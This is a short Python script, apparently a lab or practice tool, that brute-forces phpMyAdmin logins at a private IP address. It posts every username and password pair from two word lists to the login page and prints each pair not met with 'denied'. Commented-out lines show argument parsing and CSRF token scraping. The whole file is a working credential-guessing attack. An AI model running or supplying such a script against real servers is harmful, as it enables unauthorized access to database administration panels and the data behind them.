import requests
#import argparse

#parser  = argparse.ArgumentParser()
#parser.add_argument('target_ip')
#parser.add_argument('-pw', '--passwords_file')
#parser.add_argument('-us', '--users_file')
#args    = parser.parse_args()

#if (args.users_file == None): args.users_file = 'usernames.txt'
#if (args.passwords_file == None): args.passwords_file = 'passwords.txt'

nome_utente = []
passwords = []

with open('usernames.txt','r') as username :
	nome_utente = username.read().splitlines()
		
with open('passwords.txt','r') as password :
	passwords = password.read().splitlines()
		#print("nome_utente", nome_utente)
		#print("password", passwords)
	
url = 'http://192.168.1.64/phpMyAdmin/index.php'
#url = url.split('?')[0]

#print (users)

#token   = requests.get(url).text.split('name="token"')[1].split('"')[1]

for n in nome_utente:
    for p in passwords:
        data = {
            'pma_username': n,
            'pma_password': p,
            #'token': token,
        }

        login = requests.post(url, data=data)
        if ('denied' not in login.text):
            print(n, p)
